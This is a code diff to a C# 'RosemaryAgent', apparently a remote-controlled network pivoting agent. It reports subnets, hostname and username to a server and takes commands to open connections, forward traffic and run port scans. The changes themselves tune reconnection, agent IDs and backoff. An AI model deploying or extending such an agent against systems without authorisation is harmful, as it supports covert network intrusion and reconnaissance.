@@ -83,6 +83,7 @@ public class RosemaryAgent {
     BlockingCollection<RosemaryStreamBuf> _incoming;
     long _sid;
     string _agentId = "";
+    string _prevId = "";
     readonly ConcurrentDictionary<string, TcpClient> _tcp = new ConcurrentDictionary<string, TcpClient>();
     readonly ConcurrentDictionary<string, UdpClient> _udp = new ConcurrentDictionary<string, UdpClient>();
     readonly ConcurrentDictionary<string, TcpListener> _lns = new ConcurrentDictionary<string, TcpListener>();
@@ -695,13 +696,29 @@ public class RosemaryAgent {
     }
 
     async Task RunSession(RmReadFunc readN, RmWriteFunc write) {
+        // Cancel and close stale listeners from the previous session
+        foreach (var kv in _lcts) { try { kv.Value.Cancel(); } catch { } }
+        _lcts.Clear();
+        foreach (var kv in _lns) { try { kv.Value.Stop(); } catch { } }
+        _lns.Clear();
+        foreach (var kv in _ulns) { try { kv.Value.Close(); } catch { } }
+        _ulns.Clear();
+        foreach (var kv in _tcp) { try { kv.Value.Close(); } catch { } }
+        _tcp.Clear();
+        foreach (var kv in _udp) { try { kv.Value.Close(); } catch { } }
+        _udp.Clear();
+        foreach (var kv in _fwdConns) { try { kv.Value.Close(); } catch { } }
+        _fwdConns.Clear();
+
         _streams = new ConcurrentDictionary<uint, RosemaryStreamBuf>();
         _incoming = new BlockingCollection<RosemaryStreamBuf>(256);
         Interlocked.Exchange(ref _sid, 1);
+        string savedPrevId = _agentId.Length > 0 ? _agentId : _prevId;
         _agentId = "";
         Task.Run(() => YamuxLoop(readN, write));
         var subnets = GetSubnets();
-        string regPay = "{\"subnets\":[" + string.Join(",", subnets.Select(s => "\"" + JE(s) + "\"")) + "],\"os\":\"windows\",\"hostname\":\"" + JE(GetHostname()) + "\",\"username\":\"" + JE(GetUser()) + "\",\"has_internet\":" + (HasInternet() ? "true" : "false") + "}";
+        string prevPart = savedPrevId.Length > 0 ? ",\"prev_id\":\"" + JE(savedPrevId) + "\"" : "";
+        string regPay = "{\"subnets\":[" + string.Join(",", subnets.Select(s => "\"" + JE(s) + "\"")) + "],\"os\":\"windows\",\"hostname\":\"" + JE(GetHostname()) + "\",\"username\":\"" + JE(GetUser()) + "\",\"has_internet\":" + (HasInternet() ? "true" : "false") + prevPart + "}";
         await SendMsg(write, "register", regPay, "");
         Task.Run(async () => {
             while (!_cts.IsCancellationRequested) {
@@ -724,9 +741,9 @@ public class RosemaryAgent {
                     string type = JStr(plain, "type");
                     string payload = JObj(plain, "payload");
                     switch (type) {
-                        case "register_ok": _agentId = JStr(payload, "id"); break;
+                        case "register_ok": _agentId = JStr(payload, "id"); _prevId = _agentId; break;
                         case "reconnect": _cts.Cancel(); break;
-                        case "disconnect": await Task.Delay(400); Environment.Exit(0); break;
+                        case "disconnect": await Task.Delay(1000); Environment.Exit(0); break;
                         case "connect": await HandleConnect(write, payload); break;
                         case "data": HandleData(payload); break;
                         case "port-scan-request": await HandlePortScan(write, payload); break;
@@ -754,7 +771,7 @@ public class RosemaryAgent {
     }
 
     public async Task RunWS(string addr, string wsPath) {
-        int backoff = 5000;
+        int backoff = 2000;
         while (!_stopCts.IsCancellationRequested) {
             _cts = new CancellationTokenSource();
             try {
@@ -769,7 +786,7 @@ public class RosemaryAgent {
                 var respEnc = Enc(Encoding.UTF8.GetBytes("{\"type\":\"auth_response\",\"payload\":" + payRaw + "}"));
                 await ws.SendAsync(new ArraySegment<byte>(respEnc), WebSocketMessageType.Binary, true, _cts.Token);
                 Log("[rm] auth sent, running session...");
-                backoff = 5000;
+                backoff = 2000;
                 var wsMu = new SemaphoreSlim(1, 1);
                 var wsBuf = new List<byte>();
                 RmReadFunc WsReadN = async (n) => {
@@ -785,7 +802,7 @@ public class RosemaryAgent {
             _cts.Cancel();
             if (_stopCts.IsCancellationRequested) break;
             try { await Task.Delay(backoff, _stopCts.Token); } catch { break; }
-            backoff = Math.Min(backoff * 2, 60000);
+            backoff = Math.Min(backoff * 2, 10000);
         }
     }
 
